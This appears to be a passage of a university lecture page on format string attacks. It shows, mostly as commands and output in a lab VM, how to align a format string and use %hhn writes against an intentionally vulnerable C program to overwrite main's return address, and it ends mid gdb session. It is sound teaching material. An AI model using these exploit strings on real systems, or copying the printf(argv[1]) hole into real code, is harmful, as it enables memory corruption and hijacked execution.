@@ -1,0 +1,865 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<!-- 2015-11-23 Mon 18:27 -->
+<meta  http-equiv="Content-Type" content="text/html;charset=utf-8">
+<meta  name="viewport" content="width=device-width, initial-scale=1">
+<title>Lec. 21: Format String Attacks III</title>
+<meta  name="generator" content="Org-mode">
+<meta  name="author" content="Adam Aviv">
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  pre.src-sh:before    { content: 'sh'; }
+  pre.src-bash:before  { content: 'sh'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-R:before     { content: 'R'; }
+  pre.src-perl:before  { content: 'Perl'; }
+  pre.src-java:before  { content: 'Java'; }
+  pre.src-sql:before   { content: 'SQL'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" type="text/css" href="../class.css" />
+<link rel="stylesheet" type="text/css" href="../print.css" media="print" />
+<div class="page-head">
+SI485H: Stack Based Binary Exploits and Defenses (F15)
+</div>
+<hr>
+<a href="../../index.html">Home</a> <a href="../../policy.html">Policy</a> <a href="../../cal.html">Calendar</a>  <a href="../../rsc/index.html">Resources</a>
+<hr>
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012-2013 Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+</head>
+<body>
+<div id="content">
+<h1 class="title">Lec. 21: Format String Attacks III</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#orgheadline4">1. Overwriting the Return Address using a Format</a>
+<ul>
+<li><a href="#orgheadline1">1.1. Alignment</a></li>
+<li><a href="#orgheadline2">1.2. Writing Bytes</a></li>
+<li><a href="#orgheadline3">1.3. Overwriting the return address</a></li>
+</ul>
+</li>
+<li><a href="#orgheadline8">2. Formatting With Less Help</a>
+<ul>
+<li><a href="#orgheadline5">2.1. Alignment</a></li>
+<li><a href="#orgheadline6">2.2. Determining where to write</a></li>
+<li><a href="#orgheadline7">2.3. Writing Byes</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-orgheadline4" class="outline-2">
+<h2 id="orgheadline4"><span class="section-number-2">1</span> Overwriting the Return Address using a Format</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+So far, we've used format string attacks to overwrite a arbitrary
+value, but we need to now consider using this with an exploit. 
+</p>
+
+<p>
+Let's return to the example code we used the last time, but this time
+there is a function <code>foo()</code> that we wish to call by overwriting the
+return address of <code>main()</code>.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">"print_stack.h"</span>
+
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">foo</span>(){
+  printf(<span style="color: #ffa07a;">"Go Navy!\n"</span>);
+}
+
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">argv</span>[]){
+
+  <span style="color: #00ffff;">static</span> <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">test_val</span> = 0x00616161; <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">"AAA\0" as an int</span>
+
+  printf(<span style="color: #ffa07a;">"Right: "</span>);
+  printf(<span style="color: #ffa07a;">"%s"</span>, argv[1]);
+  printf(<span style="color: #ffa07a;">"\n\n"</span>);
+
+  printf(<span style="color: #ffa07a;">"Wrong: "</span>);
+  printf(argv[1]);      <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">&lt;------!!!!!</span>
+  printf(<span style="color: #ffa07a;">"\n\n"</span>);
+
+  printf(<span style="color: #ffa07a;">"[*] test_val @ %p = %#08x\n"</span>, &amp;test_val,test_val);
+
+
+  print_stack(<span style="color: #ffa07a;">"main"</span>,2);
+
+  <span style="color: #00ffff;">return</span>;
+
+}
+</pre>
+</div>
+
+<p>
+Note, I also added the <code>print_stack()</code> function so we can see what's
+going in a bit more detail. We will eventually remove it in the
+complete attack.
+</p>
+</div>
+
+<div id="outline-container-orgheadline1" class="outline-3">
+<h3 id="orgheadline1"><span class="section-number-3">1.1</span> Alignment</h3>
+<div class="outline-text-3" id="text-1-1">
+<p>
+Before doing all that dirty work, let's setup our format string to be
+properly aligned so we won't have to do a bunch of recalculations. The
+goal is to produce a format string of the right length, with all the
+parts present, such that we can just focus on writing bytes.
+</p>
+
+<pre class="example">
+                              need four totoal formats two-pair 
+    addr2   addr4            formats to write a four-byte address
+     /\      /\   .-------------------------------'---------------------.
+    |  |    |  | /                                                       \
+AAAABBBBCCCCDDDD%1$008x.%1$00x.%1$008x.%1$00x.%1$008x.%1$00x.%1$008x.%1$00x
+|  |    |  |    \            /           \
+ \/      \/      '-----.----'             '--- the index will change based
+addr1   addr3         |                        on alignment and 00x will be hhn
+                      |
+                   one format to adjust number of output bytes in foramte
+                   and one format to be replaced by hhn to do the writing
+</pre>
+
+<p>
+Let's give this format a warm up shot in our program:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln AAAABBBBCCCCDDDD%1\$008x.%1\$00x.%1\$008x.%1\$00x.%1\$008x.%1$00x.%1\$008x.%1\$00x
+Right: AAAABBBBCCCCDDDD%1$008x.%1$00x.%1$008x.%1$00x.%1$008x.%1-bash0x.%1$008x.%1$00x
+
+Wrong: AAAABBBBCCCCDDDDbffff85b.bffff85b.bffff85b.bffff85b.bffff85b.%1-bash0x.bffff85b.bffff85b
+
+[*] test_val @ 0x804a028 = 0x616161
+--- STACK main ---
+0xbffff6a4 &lt;ebp+0xc&gt;: bffff734
+0xbffff6a0 &lt;ebp+0x8&gt;: 00000002
+0xbffff69c &lt;ebp+0x4&gt;: b7e33a83
+0xbffff698 &lt;ebp&gt;: 00000000
+0xbffff694 &lt;ebp-0x4&gt;: 00000000
+0xbffff690 &lt;ebp-0x8&gt;: 08048610
+0xbffff68c &lt;ebp-0xc&gt;: b7fc4000
+0xbffff688 &lt;ebp-0x10&gt;: 00616161
+0xbffff684 &lt;ebp-0x14&gt;: 00000002
+0xbffff680 &lt;ebp-0x18&gt;: 08048725
+0xbffff67c &lt;ebp-0x1c&gt;: 08048603
+0xbffff678 &lt;ebp-0x20&gt;: bffff698
+</pre>
+
+<p>
+Ok, that looks good. Now we need to find at what index we find the
+start of the format string itself so we can remove the AAAA and BBBB
+and CCCC and DDDD and replace them with addresses we want to write
+too. For that, we can use a bash script:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ for i in `seq 1 1 200`;  do echo -n "$i "; ./fmt_vuln AAAABBBBCCCCDDDD%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%1\$008x.%$i\$00x | grep Wrong ; done | grep 41
+41 Wrong: AAAABBBBCCCCDDDDbffff85a.b7fed180.bffff85a.b7fed180.bffff85a.b7fed180.bffff85a.b7fed180
+70 Wrong: AAAABBBBCCCCDDDDbffff85a.b7fdd414.bffff85a.b7fdd414.bffff85a.b7fdd414.bffff85a.b7fdd414
+121 Wrong: AAAABBBBCCCCDDDDbffff856.4141006e.bffff856.4141006e.bffff856.4141006e.bffff856.4141006e
+122 Wrong: AAAABBBBCCCCDDDDbffff856.42424141.bffff856.42424141.bffff856.42424141.bffff856.42424141
+141 Wrong: AAAABBBBCCCCDDDDbffff856.30302431.bffff856.30302431.bffff856.30302431.bffff856.30302431
+</pre>
+<p>
+Essentially, we iterate through the indexes until we find some
+sequence of 0x41's (or other values we are interested in. If you look
+above, at 121 and 122 we see the sequences that matter, but they
+aren't quite align the way we want. We need to add two bytes to the
+string to get the alignment to work.
+</p>
+<pre class="example">
+user@si485H-base:demo$ for i in `seq 1 1 200`;  do echo -n "$i "; ./fmt_vuln AAAABBBBCCCCDDDD..%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%1\$008x.%$i\$00x | grep Wrong ; done | grep 41
+41 Wrong: AAAABBBBCCCCDDDD..bffff858.b7fed180.bffff858.b7fed180.bffff858.b7fed180.bffff858.b7fed180
+70 Wrong: AAAABBBBCCCCDDDD..bffff858.b7fdd414.bffff858.b7fdd414.bffff858.b7fdd414.bffff858.b7fdd414
+121 Wrong: AAAABBBBCCCCDDDD..bffff854.41414141.bffff854.41414141.bffff854.41414141.bffff854.41414141
+141 Wrong: AAAABBBBCCCCDDDD..bffff854.30302431.bffff854.30302431.bffff854.30302431.bffff854.30302431
+</pre>
+<p>
+Notice the extra ".." following the D's to get everything to align
+properly, if we use 121.
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln AAAABBBBCCCCDDDD..%1\$008x.%121\$00x.%1\$008x.%122\$00x.%1\$008x.%123\$00x.%1\$008x.%124\$00x
+Right: AAAABBBBCCCCDDDD..%1$008x.%121$00x.%1$008x.%122$00x.%1$008x.%123$00x.%1$008x.%124$00x
+
+Wrong: AAAABBBBCCCCDDDD..bffff854.41414141.bffff854.42424242.bffff854.43434343.bffff854.44444444
+
+[*] test_val @ 0x804a028 = 0x616161
+--- STACK main ---
+0xbffff694 &lt;ebp+0xc&gt;: bffff724
+0xbffff690 &lt;ebp+0x8&gt;: 00000002
+0xbffff68c &lt;ebp+0x4&gt;: b7e33a83
+0xbffff688 &lt;ebp&gt;: 00000000
+0xbffff684 &lt;ebp-0x4&gt;: 00000000
+0xbffff680 &lt;ebp-0x8&gt;: 08048610
+0xbffff67c &lt;ebp-0xc&gt;: b7fc4000
+0xbffff678 &lt;ebp-0x10&gt;: 00616161
+0xbffff674 &lt;ebp-0x14&gt;: 00000002
+0xbffff670 &lt;ebp-0x18&gt;: 08048725
+0xbffff66c &lt;ebp-0x1c&gt;: 08048603
+0xbffff668 &lt;ebp-0x20&gt;: bffff688
+</pre>
+
+<p>
+Now we have what we need to completely aligned format string to use in our exploit by
+writing bytes to the right place.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline2" class="outline-3">
+<h3 id="orgheadline2"><span class="section-number-3">1.2</span> Writing Bytes</h3>
+<div class="outline-text-3" id="text-1-2">
+<p>
+With a properly aligned format, let's start by writing the bytes we
+want to a locale that we can see clearly the bytes we are writing. The
+sample code makes this easy, we'll write to the test value at
+0x804a02r. It's just a matter of putting that address into our format
+string and inserting some hhn's for writing.
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln $(printf '\x27\xa0\x04\x08')$(printf '\x26\xa0\x04\x08')$(printf '\x25\xa0\x04\x08')$(printf '\x24\xa0\x04\x08')..%1\$008x.%121\$hhn.%1\$008x.%122\$hhn.%1\$008x.%123\$hhn.%1\$008x.%124\$hhn
+Right: '&amp;%$..%1$008x.%121$hhn.%1$008x.%122$hhn.%1$008x.%123$hhn.%1$008x.%124$hhn
+
+Wrong: '&amp;%$..bffff854..bffff854..bffff854..bffff854.
+
+[*] test_val @ 0x804a024 = 0x1b252f39
+--- STACK main ---
+0xbffff694 &lt;ebp+0xc&gt;: bffff724
+0xbffff690 &lt;ebp+0x8&gt;: 00000002
+0xbffff68c &lt;ebp+0x4&gt;: b7e33a83
+0xbffff688 &lt;ebp&gt;: 00000000
+0xbffff684 &lt;ebp-0x4&gt;: 00000000
+0xbffff680 &lt;ebp-0x8&gt;: 080485e0
+0xbffff67c &lt;ebp-0xc&gt;: b7fc4000
+0xbffff678 &lt;ebp-0x10&gt;: 1b252f39
+0xbffff674 &lt;ebp-0x14&gt;: 00000002
+0xbffff670 &lt;ebp-0x18&gt;: 080486f5
+0xbffff66c &lt;ebp-0x1c&gt;: 080485d3
+0xbffff668 &lt;ebp-0x20&gt;: bffff688
+</pre>
+<p>
+Notice, that by planning, we are perfectly aligned because 00x is 3
+characters long and so is hhn. 
+</p>
+
+<p>
+Also notice, that we are writing the bytes from <b>most significant</b>
+to * least significant*. This is important because as we build up our
+format, if we have to change the value we bytes earlier, that changes
+the value of bytes later because it increases the length of the
+format. However, consider that when writing addresses, it is the least
+significant portion of the address space that will change more than
+the most significant portion. By writing the values from most to
+least, this means that the portion of the address which will change
+the least will not be affected by the portion that will change the
+most. For example, if we are writing to address 0xbffff982, but that
+changes to 0xbffff945, we don't want to have to change the format
+writing of 0xbffff9 because the 45 changed to 82.  (BELIEVE ME ON
+THIS, I had to rework this lesson multiple times to fix these
+problems. Write your bytes most-to-least significant!)
+</p>
+
+<p>
+Now, that we've gotten all that out of the way, let's get down to the
+business of writing bytes. First, let's find the address of <code>foo()</code>:
+</p>
+<pre class="example">
+user@si485H-base:demo$ objdump -d fmt_vuln | grep foo
+0804852d &lt;foo&gt;:
+</pre>
+<p>
+Now we get to work. In the most significant byte, currently we are
+writing 0x1b but we need 0x08. This means we have to wrap around. Doing some math:
+</p>
+<pre class="example">
+user@si485H-base:demo$ python -c "print (0x100 - 0x1b) + 0x8 + 8"
+245
+</pre>
+<p>
+We need to write 256 bytes to get to 0x08 when accounting for the 8
+bytes we are already writing.
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln $(printf '\x27\xa0\x04\x08')$(printf '\x26\xa0\x04\x08')$(printf '\x25\xa0\x04\x08')$(printf '\x24\xa0\x04\x08')..%1\$245x.%121\$hhn.%1\$008x.%122\$hhn.%1\$008x.%123\$hhn.%1\$008x.%124\$hhn
+Right: '&amp;%$..%1$245x.%121$hhn.%1$008x.%122$hhn.%1$008x.%123$hhn.%1$008x.%124$hhn
+
+Wrong: '&amp;%$..                                                                                                                                                                                                                                             bffff854..bffff854..bffff854..bffff854.
+
+[*] test_val @ 0x804a024 = 0x8121c26
+--- STACK main ---
+0xbffff694 &lt;ebp+0xc&gt;: bffff724
+0xbffff690 &lt;ebp+0x8&gt;: 00000002
+0xbffff68c &lt;ebp+0x4&gt;: b7e33a83
+0xbffff688 &lt;ebp&gt;: 00000000
+0xbffff684 &lt;ebp-0x4&gt;: 00000000
+0xbffff680 &lt;ebp-0x8&gt;: 080485e0
+0xbffff67c &lt;ebp-0xc&gt;: b7fc4000
+0xbffff678 &lt;ebp-0x10&gt;: 08121c26
+0xbffff674 &lt;ebp-0x14&gt;: 00000002
+0xbffff670 &lt;ebp-0x18&gt;: 080486f5
+0xbffff66c &lt;ebp-0x1c&gt;: 080485d3
+0xbffff668 &lt;ebp-0x20&gt;: bffff688
+</pre>
+
+<p>
+Now we need to write 04 byte we are writing 12, so we use the same
+calculation again:
+</p>
+<pre class="example">
+user@si485H-base:demo$ python -c "print (0x100 - 0x12) + 0x4 + 8"
+250
+</pre>
+<p>
+Updating our format to do 250 bytes of output:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln $(printf '\x27\xa0\x04\x08')$(printf '\x26\xa0\x04\x08')$(printf '\x25\xa0\x04\x08')$(printf '\x24\xa0\x04\x08')..%1\$245x.%121\$hhn.%1\$250x.%122\$hhn.%1\$008x.%123\$hhn.%1\$008x.%124\$hhn
+Right: '&amp;%$..%1$245x.%121$hhn.%1$250x.%122$hhn.%1$008x.%123$hhn.%1$008x.%124$hhn
+
+Wrong: '&amp;%$..                                                                                                                                                                                                                                             bffff854..                                                                                                                                                                                                                                                  bffff854..bffff854..bffff854.
+
+[*] test_val @ 0x804a024 = 0x8040e18
+--- STACK main ---
+0xbffff694 &lt;ebp+0xc&gt;: bffff724
+0xbffff690 &lt;ebp+0x8&gt;: 00000002
+0xbffff68c &lt;ebp+0x4&gt;: b7e33a83
+0xbffff688 &lt;ebp&gt;: 00000000
+0xbffff684 &lt;ebp-0x4&gt;: 00000000
+0xbffff680 &lt;ebp-0x8&gt;: 080485e0
+0xbffff67c &lt;ebp-0xc&gt;: b7fc4000
+0xbffff678 &lt;ebp-0x10&gt;: 08040e18
+0xbffff674 &lt;ebp-0x14&gt;: 00000002
+0xbffff670 &lt;ebp-0x18&gt;: 080486f5
+0xbffff66c &lt;ebp-0x1c&gt;: 080485d3
+0xbffff668 &lt;ebp-0x20&gt;: bffff688
+</pre>
+<p>
+Next we are writing 0x0e and we need to be writing 0x85, so again, math:
+</p>
+<pre class="example">
+user@si485H-base:demo$ python -c "print 0x85 - 0x0e + 8"
+127
+</pre>
+<p>
+And an update of the format string:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln $(printf '\x27\xa0\x04\x08')$(printf '\x26\xa0\x04\x08')$(printf '\x25\xa0\x04\x08')$(printf '\x24\xa0\x04\x08')..%1\$245x.%121\$hhn.%1\$250x.%122\$hhn.%1\$127x.%123\$hhn.%1\$008x.%124\$hhn
+Right: '&amp;%$..%1$245x.%121$hhn.%1$250x.%122$hhn.%1$127x.%123$hhn.%1$008x.%124$hhn
+
+Wrong: '&amp;%$..                                                                                                                                                                                                                                             bffff854..                                                                                                                                                                                                                                                  bffff854..                                                                                                                       bffff854..bffff854.
+
+[*] test_val @ 0x804a024 = 0x804858f
+--- STACK main ---
+0xbffff694 &lt;ebp+0xc&gt;: bffff724
+0xbffff690 &lt;ebp+0x8&gt;: 00000002
+0xbffff68c &lt;ebp+0x4&gt;: b7e33a83
+0xbffff688 &lt;ebp&gt;: 00000000
+0xbffff684 &lt;ebp-0x4&gt;: 00000000
+0xbffff680 &lt;ebp-0x8&gt;: 080485e0
+0xbffff67c &lt;ebp-0xc&gt;: b7fc4000
+0xbffff678 &lt;ebp-0x10&gt;: 0804858f
+0xbffff674 &lt;ebp-0x14&gt;: 00000002
+0xbffff670 &lt;ebp-0x18&gt;: 080486f5
+0xbffff66c &lt;ebp-0x1c&gt;: 080485d3
+0xbffff668 &lt;ebp-0x20&gt;: bffff688
+</pre>
+<p>
+Now the last byte. We are writing 8f and the target is 2d, which means wrapping around:
+</p>
+<pre class="example">
+user@si485H-base:demo$ python -c "print (0x100 - 0x8f) + 0x2d + 8"
+166
+</pre>
+<p>
+And now we've got it:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln $(printf '\x27\xa0\x04\x08')$(printf '\x26\xa0\x04\x08')$(printf '\x25\xa0\x04\x08')$(printf '\x24\xa0\x04\x08')..%1\$245x.%121\$hhn.%1\$250x.%122\$hhn.%1\$127x.%123\$hhn.%1\$166x.%124\$hhn
+Right: '&amp;%$..%1$245x.%121$hhn.%1$250x.%122$hhn.%1$127x.%123$hhn.%1$166x.%124$hhn
+
+Wrong: '&amp;%$..                                                                                                                                                                                                                                             bffff854..                                                                                                                                                                                                                                                  bffff854..                                                                                                                       bffff854..                                                                                                                                                              bffff854.
+
+[*] test_val @ 0x804a024 = 0x804852d
+--- STACK main ---
+0xbffff694 &lt;ebp+0xc&gt;: bffff724
+0xbffff690 &lt;ebp+0x8&gt;: 00000002
+0xbffff68c &lt;ebp+0x4&gt;: b7e33a83
+0xbffff688 &lt;ebp&gt;: 00000000
+0xbffff684 &lt;ebp-0x4&gt;: 00000000
+0xbffff680 &lt;ebp-0x8&gt;: 080485e0
+0xbffff67c &lt;ebp-0xc&gt;: b7fc4000
+0xbffff678 &lt;ebp-0x10&gt;: 0804852d
+0xbffff674 &lt;ebp-0x14&gt;: 00000002
+0xbffff670 &lt;ebp-0x18&gt;: 080486f5
+0xbffff66c &lt;ebp-0x1c&gt;: 080485d3
+0xbffff668 &lt;ebp-0x20&gt;: bffff688
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgheadline3" class="outline-3">
+<h3 id="orgheadline3"><span class="section-number-3">1.3</span> Overwriting the return address</h3>
+<div class="outline-text-3" id="text-1-3">
+<p>
+Now, that we have everything in place, it's only a matter of
+overwriting the return address. Fortunately, I've been printing out
+the stack each time to make life easier, so we know the address of the
+return address is 0xbffff68c. We can now stick that in to the from of
+our format string to complete the exploit.
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln $(printf '\x8f\xf6\xff\xbf')$(printf '\x8e\xf6\xff\xbf')$(printf '\x8d\xf6\xff\xbf')$(printf '\x8c\xf6\xff\xbf')..%1\$245x.%121\$hhn.%1\$250x.%122\$hhn.%1\$127x.%123\$hhn.%1\$166x.%124\$hhn
+Right: ????????????????..%1$245x.%121$hhn.%1$250x.%122$hhn.%1$127x.%123$hhn.%1$166x.%124$hhn
+
+Wrong: ????????????????..                                                                                                                                                                                                                                             bffff854..                                                                                                                                                                                                                                                  bffff854..                                                                                                                       bffff854..                                                                                                                                                              bffff854.
+
+[*] test_val @ 0x804a024 = 0x616161
+--- STACK main ---
+0xbffff694 &lt;ebp+0xc&gt;: bffff724
+0xbffff690 &lt;ebp+0x8&gt;: 00000002
+0xbffff68c &lt;ebp+0x4&gt;: 0804852d
+0xbffff688 &lt;ebp&gt;: 00000000
+0xbffff684 &lt;ebp-0x4&gt;: 00000000
+0xbffff680 &lt;ebp-0x8&gt;: 080485e0
+0xbffff67c &lt;ebp-0xc&gt;: b7fc4000
+0xbffff678 &lt;ebp-0x10&gt;: 00616161
+0xbffff674 &lt;ebp-0x14&gt;: 00000002
+0xbffff670 &lt;ebp-0x18&gt;: 080486f5
+0xbffff66c &lt;ebp-0x1c&gt;: 080485d3
+0xbffff668 &lt;ebp-0x20&gt;: bffff688
+Go Navy!
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgheadline8" class="outline-2">
+<h2 id="orgheadline8"><span class="section-number-2">2</span> Formatting With Less Help</h2>
+<div class="outline-text-2" id="text-2">
+<p>
+Ok, now that we've seen this in action, we need to pull away some of
+the aids that's have been making this easier. In particular, let's no
+longer print the stack each time and let's get rid of the
+test<sub>val</sub>. Instead, we'll have a much, much plainer vulnerable program.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">foo</span>(){
+  printf(<span style="color: #ffa07a;">"Go Navy!\n"</span>);
+}
+
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">argv</span>[]){
+
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">a</span> = 0xdeadbeef;
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">LOTS OF CODE MIGHT BE HERE</span>
+  printf(argv[1]);
+
+  <span style="color: #00ffff;">return</span>;
+}
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgheadline5" class="outline-3">
+<h3 id="orgheadline5"><span class="section-number-3">2.1</span> Alignment</h3>
+<div class="outline-text-3" id="text-2-1">
+<p>
+Aligning our format is mostly the same process; however, finding the
+target address to overwrite will be different. We should consider a
+format that will both allow us to do arbitrary writes <i>AND</i> check what
+we are writing. 
+</p>
+
+<p>
+This format output is essentially the same as what we've done before,
+but I've added one extra format to the end.
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./plain_fmt AAAABBBBCCCCDDDD%1\$008x.%1\$00x.%1\$008x.%1\$00x.%1\$008x.%1\$00x.%1\$008x.%1\$00x.%1\$#08x
+AAAABBBBCCCCDDDDbffff724.bffff724.bffff724.bffff724.bffff724.bffff724.bffff724.bffff724.0xbffff724
+</pre>
+<p>
+That extra format, we'll align up to 0xdeadbeef: 
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./plain_fmt AAAABBBBCCCCDDDD%1\$008x.%1\$00x.%1\$008x.%1\$00x.%1\$008x.%1\$00x.%1\$008x.%1\$00x.%7\$#08x
+AAAABBBBCCCCDDDDbffff724.bffff724.bffff724.bffff724.bffff724.bffff724.bffff724.bffff724.0xdeadbeef
+</pre>
+<p>
+This will be our target we'll write to. Now to align the rest of the
+format.
+</p>
+<pre class="example">
+user@si485H-base:demo$ for i in `seq 1 1 200`; do echo -n "$i "; ./plain_fmt AAAABBBBCCCCDDDD%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%7\$#08x ; done | grep 41
+41 AAAABBBBCCCCDDDDbffff724.2.bffff724.2.bffff724.2.bffff724.2.0xdeadbeef
+74 AAAABBBBCCCCDDDDbffff724.b7fdd414.bffff724.b7fdd414.bffff724.b7fdd414.bffff724.b7fdd414.0xdeadbeef
+123 AAAABBBBCCCCDDDDbffff724.41414141.bffff724.41414141.bffff724.41414141.bffff724.41414141.0xdeadbeef
+141 AAAABBBBCCCCDDDDbffff724.252e7838.bffff724.252e7838.bffff724.252e7838.bffff724.252e7838.0xdeadbeef
+</pre>
+<p>
+And we see that at 123, we find the alignment we are looking for.
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./plain_fmt AAAABBBBCCCCDDDD%1\$008x.%123\$00x.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x 
+AAAABBBBCCCCDDDDbffff724.41414141.bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgheadline6" class="outline-3">
+<h3 id="orgheadline6"><span class="section-number-3">2.2</span> Determining where to write</h3>
+<div class="outline-text-3" id="text-2-2">
+<p>
+Now, things get a bit sticky. We have the aligned format but we are
+not entirely sure what address to replace the A's, B's, C's, and D's
+with. Let's fire up gdb and see if we can learn something more about
+the address alignment.
+</p>
+<pre class="example">
+(gdb) br main
+Breakpoint 1 at 0x804849a: file plain_fmt.c, line 12.
+(gdb) r AAAABBBBCCCCDDDD%1\$008x.%123\$00x.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x 
